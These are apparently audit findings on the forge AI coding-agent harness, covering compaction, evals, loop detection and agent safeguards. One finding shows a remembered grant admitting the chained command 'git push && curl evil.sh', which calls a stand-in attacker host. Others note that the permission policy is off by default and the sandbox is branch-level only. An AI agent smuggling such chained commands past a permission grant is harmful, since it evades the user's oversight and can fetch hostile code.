subject: forge
title: Fully LLM-free deterministic compaction: evict/retain windows fold the evicted range into a mechanical operation-kind-aware summary rendered by template - no model is ever called to compact
evidence: crates/forge_app/src/compact.rs:41-59 (evict.min(retain) strategy), :59-172 (compress_single_sequence, no provider call); crates/forge_domain/src/compact/compact_config.rs:123,131-135; grep chat|provider in crates/forge_domain/src/compact/*: zero
one_why: Every anchor compacts by LLM summarization (codex keeps one no-LLM token-budget tier); forge makes determinism the whole design - zero compaction cost, zero summarization hallucination surface, reproducible folds (TrimContextSummary keeps only the last op per file/command/search key) - the trade is fidelity loss on prose-heavy ranges, so it pairs with their /compact manual path rather than replacing judgment entirely.

subject: forge
title: Compaction extracts the LAST reasoning_details from the compacted range and injects it into the first surviving assistant message, preserving Anthropic thinking-block chain continuity without exponential accumulation; usage of destroyed messages is summed onto the summary entry so cost accounting survives the fold
evidence: crates/forge_app/src/compact.rs:109-172 (comment + impl), :136-152 (usage accumulation), property tests compact.rs:182-240, :639-649
one_why: Every harness that compacts a Claude thinking session silently breaks the reasoning signature chain (first surviving assistant must carry reasoning) or accumulates it across compactions; the last-wins injection is a two-line mechanism no anchor has, and the usage carry means lifetime cost stays truthful after folds - directly portable.

subject: forge
title: Policy engine (Allow/Deny/Confirm + All/Any/Not over globs, tested) only runs when config.restricted is true, which defaults false and has no CLI surface; first-run init writes an allow-all permissions file (read **/*, write **/*, command *, url *) so even restricted installs confirm nothing
one_why: The engine's own no-policies default is Confirm (forge_domain/src/policies/engine.rs:28-57), proving intended posture was ask-first - the allow-all seed plus serde-default-false off switches invert it silently; a tested engine that binds nothing at default config sits below the nanocoder-5 rung (which at least approves by default) despite better policy machinery.

subject: forge
title: Accept-and-Remember stores whole-string glob grants: 'git push' becomes git push*, which also admits 'git push && curl evil.sh' since glob * spans shell metacharacters; write grants become *.ext everywhere (one accepted .rs edit allows all .rs writes system-wide)
one_why: Converges with the regex-denylist family from the opposite direction: pattern-matching the raw command string cannot encode token-level intent, and the remember-flow amplifies a single approval into a permanent broad grant - grammar-parsed command policy (as in the grammar-parsed-bash-policy cluster) is the only sound fix; the dir-scoping field exists on rules but the remember-flow never populates it.

subject: forge
title: --sandbox <dir> creates a git worktree and cds into it - isolation is branch-level only; shells execute via bare tokio Command with no seatbelt/bwrap/none layer, and no SECURITY.md exists
evidence: crates/forge_main/src/sandbox.rs:11-24,75-130 (git worktree add); crates/forge_main/src/main.rs:111-115; crates/forge_infra/src/executor.rs:9,38; find for SECURITY.md: absent
one_why: Worktree isolation is a legitimate feature (and useful for blast-radius on file edits), but naming it --sandbox signals a security boundary to users who then reasonably believe commands are contained - unlike pi's exemplary SECURITY.md 'intentionally does not have a sandbox' honesty, forge neither claims nor disclaims enforcement (convergence with claurst-3, codebuff-8).

subject: forge
title: Genuine behavioral eval harness (14 suites, per-task model matrix incl. glm-4.6/minimax, CSV task fan-out, p-limit, per-eval timeout) invoked only via 'npm run eval' - no CI workflow job runs it, though ci.yml already carries OPENROUTER_API_KEY
evidence: package.json:9 (eval script); benchmarks/cli.ts; benchmarks/evals/ (14 dirs); .github/workflows/ci.yml:21 (key present), :39-74 (only llvm-cov build + rprompt perf job)
one_why: Convergence with deepagents-10 (harness wired only to manual invocation) - the one subject in the corpus whose CI env already holds the eval key yet never runs an eval makes this gap uniquely fixable; also note CI itself is generated from Rust build.rs (gh-workflow-gen header, ci.yml:1-17), so adding an evals job is a code change, which is unusually clean.

subject: forge
title: Evals verify tool-use policy by asserting jq predicates on a request-context dump (FORGE_DEBUG_REQUESTS={{dir}}/context.json) written by the agent itself - 'used patch tool', 'no patch failures from search-text mismatch' - rather than grading output text
one_why: Behavioral contract tests ('prefer patch over write for edits', 'never cd when cwd exists' suites exist for exactly this) become provider-agnostic and cheap when the harness dumps the final request and jq checks tool-call shapes - a mechanism our evals want, independent of forge's CI gap.

subject: forge
title: orch_spec drives the real Orchestrator against a scripted VecDeque of ChatCompletionMessages (TestContext harness) and asserts loop semantics: followup yields without TaskComplete, history persistence, tool-error rendering, user-message template shape
one_why: Same pattern codex uses with mock SSE servers, but at unit scale with no HTTP layer in the loop - the cheapest known way to make turn semantics (yield conditions, error budgets, hook un-yield at orch.rs:424-441) regression-proof; convergence with the faux-provider-testing cluster for a harness with no provider SDK to lean on.

subject: forge
title: Doom-loop detector matches not only consecutive identical calls but repeating n-gram cycles ([A,B,C][A,B,C]) over (tool-name, arguments) signatures, and responds with a rendered system-reminder rather than a hard stop
one_why: Only crush among anchors has loop detection and it is identical-call based; the sequence-cycle matcher over argument-qualified signatures catches alternating-pattern stalls crush misses, and the soft-reminder remediation (give the model a chance to break out before orch interrupt) is the gentler default worth copying.

subject: forge
title: Truncation of oversized shell stdout/stderr and fetch bodies writes the FULL output to a temp file (disable_cleanup) and hands the model prefix+suffix plus the file path, instead of discarding the middle
evidence: crates/forge_app/src/tool_executor.rs:67-110 (dump_operation), :98-104 (forge_shell_stdout_* temp files); config knobs max_stdout_prefix_lines/suffix in crates/forge_config/src/config.rs:34-40 (build_template_config)
one_why: Standard prefix/suffix truncation destroys evidence the model then re-runs expensive commands to recover; spill-to-tempfile keeps the full artifact one read away at zero context cost - convergence-adjacent to overflow-degradation-ladder but at per-tool-result granularity, and paired here with truncation awareness flags the model can act on.

subject: forge
title: System prompt lists available skills by name only; skill bodies are fetched on demand through a Skill tool (tool name == skill name), keeping skill corpus out of steady-state context
one_why: Converges with the lazy-skill-loading cluster; forge's wrinkle is invoking a skill by dispatching a tool call named after it (catalog.rs:1112), which makes skills visible in tool-use telemetry and thus evaluable by their own create_skill/usage eval suite (benchmarks/evals/todo_write_usage pattern generalized).

subject: forge
title: Root package.json carries name 'forge-code-evals' and license ISC while LICENSE is Apache-2.0 (GitHub-concurred), after the upstream rename antinomyhq/forge -> tailcallhq/forgecode - the mismatch is what made the census report a license conflict
evidence: package.json:2-6 (name/license ISC); LICENSE:1 (Apache-2.0); census.json forge row 'Apache-2.0 (file); ISC (manifest)'; GitHub API full_name tailcallhq/forgecode
one_why: Benign in intent (private npm wrapper for the TS benchmark harness) but it defeats license scanners and our census exactly as in the open-interpreter-2/mimo-code cluster: manifest identity is what tooling measures; canonical license is Apache-2.0, so no clean-room constraint attaches to this subject.

subject: forge
title: CI-enforced shell-prompt performance budget: a dedicated job runs scripts/benchmark.sh --threshold 60 zsh rprompt on every PR, gating the cost of the ambient zsh integration (model+cost rprompt, ':' -prefix surface)
one_why: No other subject treats prompt-draw latency as a regression-testable property, yet an ambient CLI agent that slows every prompt loses users faster than any feature bug - the budget-gate concept (pick the user-visible hot path, assert a numeric ceiling in CI) generalizes well beyond zsh.
